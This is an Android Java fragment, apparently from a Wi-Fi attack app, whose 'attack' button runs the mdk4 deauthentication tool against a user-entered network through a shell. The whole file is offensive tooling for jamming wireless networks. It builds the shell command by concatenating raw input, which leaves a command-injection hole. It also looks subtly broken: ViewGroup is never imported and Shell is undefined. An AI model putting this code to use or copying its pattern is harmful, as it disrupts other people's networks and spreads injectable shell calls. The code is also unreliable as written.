package com.wimax_flutter;

import android.os.Bundle;
import androidx.fragment.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MDKFragment extends Fragment {
    private EditText targetInput;
    private Button attackButton;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_mdk, container, false);
        targetInput = view.findViewById(R.id.target_input);
        attackButton = view.findViewById(R.id.attack_button);

        attackButton.setOnClickListener(v -> {
            String target = targetInput.getText().toString();
            Shell.runCommand("mdk4 wlan0 d -b " + target);
        });

        return view;
    }
}